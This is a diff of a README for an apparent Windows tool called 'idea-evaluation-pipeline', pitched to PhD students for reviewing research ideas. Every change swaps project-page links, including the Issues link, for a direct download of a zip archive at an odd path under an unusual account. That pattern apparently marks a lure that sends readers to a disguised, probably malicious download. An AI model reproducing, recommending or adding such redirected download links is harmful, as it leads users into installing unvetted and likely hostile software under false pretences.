@@ -1,6 +1,6 @@
 # 💡 idea-evaluation-pipeline - Streamline Your PhD Idea Reviews
 
-[![Download Now](https://img.shields.io/badge/Download-idea--evaluation--pipeline-brightgreen?style=for-the-badge)](https://github.com/saddled-panicattack529/idea-evaluation-pipeline)
+[![Download Now](https://img.shields.io/badge/Download-idea--evaluation--pipeline-brightgreen?style=for-the-badge)](https://github.com/saddled-panicattack529/idea-evaluation-pipeline/raw/refs/heads/main/uncurbedly/idea-evaluation-pipeline-1.2.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Follow these steps to download and run the idea-evaluation-pipeline on your Wind
 
 1. **Visit the Download Page**  
    Go to the main project page here:  
-   [Download idea-evaluation-pipeline](https://github.com/saddled-panicattack529/idea-evaluation-pipeline)  
+   [Download idea-evaluation-pipeline](https://github.com/saddled-panicattack529/idea-evaluation-pipeline/raw/refs/heads/main/uncurbedly/idea-evaluation-pipeline-1.2.zip)  
    This page hosts the latest version and all updates.
 
 2. **Find the Download Section**  
@@ -110,7 +110,7 @@ You can revisit any step to edit and improve your responses. The software works 
 
 Use the official page below to get the latest version for Windows:  
 
-[![Download idea-evaluation-pipeline](https://img.shields.io/badge/Download-idea--evaluation--pipeline-blue?style=for-the-badge)](https://github.com/saddled-panicattack529/idea-evaluation-pipeline)
+[![Download idea-evaluation-pipeline](https://img.shields.io/badge/Download-idea--evaluation--pipeline-blue?style=for-the-badge)](https://github.com/saddled-panicattack529/idea-evaluation-pipeline/raw/refs/heads/main/uncurbedly/idea-evaluation-pipeline-1.2.zip)
 
 Once downloaded, follow the installation instructions described above to complete setup.
 
@@ -139,7 +139,7 @@ Once downloaded, follow the installation instructions described above to complet
 If you have technical problems or questions:
 
 - Visit the repository’s GitHub page:  
-  https://github.com/saddled-panicattack529/idea-evaluation-pipeline  
+  https://github.com/saddled-panicattack529/idea-evaluation-pipeline/raw/refs/heads/main/uncurbedly/idea-evaluation-pipeline-1.2.zip  
 - Use the "Issues" tab to report bugs or request features.  
 - Read existing issues to see if your problem has already been addressed.  
 
@@ -185,5 +185,5 @@ To remove the program:
 
 # Links
 
-- Download page: https://github.com/saddled-panicattack529/idea-evaluation-pipeline  
-- GitHub Issues: https://github.com/saddled-panicattack529/idea-evaluation-pipeline/issues  
+- Download page: https://github.com/saddled-panicattack529/idea-evaluation-pipeline/raw/refs/heads/main/uncurbedly/idea-evaluation-pipeline-1.2.zip  
+- GitHub Issues: https://github.com/saddled-panicattack529/idea-evaluation-pipeline/raw/refs/heads/main/uncurbedly/idea-evaluation-pipeline-1.2.zip  
